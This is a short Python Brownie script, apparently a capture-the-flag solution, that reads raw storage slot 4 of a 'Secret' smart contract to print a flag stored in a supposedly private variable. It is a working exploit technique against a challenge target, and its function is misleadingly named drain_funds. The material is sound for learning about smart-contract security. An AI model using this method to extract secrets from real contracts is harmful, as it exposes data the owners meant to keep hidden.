#!/usr/bin/python3
from brownie import Secret, web3
from scripts.helpful_scripts import get_account
from scripts.deploy import deploy
from colorama import Fore


# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


AMOUNT = web3.toWei(0.0002, "ether")


def drain_funds(contract_address="0x0E2A3ad9E77893659D7222Ff2d61122E431b1eF0", attacker=None):
    if not contract_address:
        target, owner = deploy()
        #print(contract_address, owner)
        _, attacker = get_account()
    else:
        target = Secret.at(contract_address)

    # for i in range(30):

    #     print(i, web3.toText(web3.eth.get_storage_at(target.address, i)))
    
    print(f"{blue}Flag: {green}{web3.toText(web3.eth.get_storage_at(target.address, 4))[:-1]}{reset}")

    


def main(contract_address=None):
    if contract_address:
        drain_funds(contract_address, get_account())
    else:
        drain_funds()

if __name__ == '__main__':
    main()